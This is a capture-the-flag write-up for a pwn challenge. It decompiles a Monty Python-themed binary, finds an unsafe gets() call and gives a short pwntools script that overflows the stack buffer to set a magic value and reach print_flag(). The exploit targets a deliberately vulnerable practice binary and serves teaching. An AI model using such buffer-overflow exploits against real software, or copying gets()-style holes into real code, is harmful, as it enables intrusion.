# Pwn1 (pwn)
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/11e7f702-aff5-429b-b10a-b449f21d759c)  

The executable starts by asking a question, and ends execution for any answer I try
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/d2983e3e-f3c3-48b1-b765-188fb85eca5c)  

Let's load it in ghidra and see what we can find  

```c
undefined4 main(void)

{
  int iVar1;
  char local_43 [43];
  uint local_18;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == 0xdea110c8) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```
A Monty Python and the Holy Grail reference, very nice :D  
Actually looking at the program, we can identify the use of `gets`  bad >:(  
Then there is a check, that if true we call a `print_flag()` function. However, there is no (legal) way to write to local_18.  
However since `gets` is vulnerable, we can use it to write to local_18.  

## Exploitation
First we want to reach the call to `gets`. To achieve this we can send the following lines:
```
Sir Lancelot of Camelot
To seek the Holy Grail.
```
Then we can reach `gets`.
The stack layout will look like this
```
| local_43  |
| local_43+1|
| local_43+2|
|...........|
|...........|
|local_43+42|
| local_18  |
```
Therefore we can just write 43 bytes of garbage and then the magic value that we need local_18 to be.

```python
from pwn import *

r = process('./pwn1')
r.sendline(b'Sir Lancelot of Camelot')
r.sendline(b'To seek the Holy Grail.')

offset = b'A'*43

magic = p32(0xdea110c8)

r.sendline(offset + magic)
r.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/94138a15-b3fc-41c2-b4fb-dfc0245b47ba)
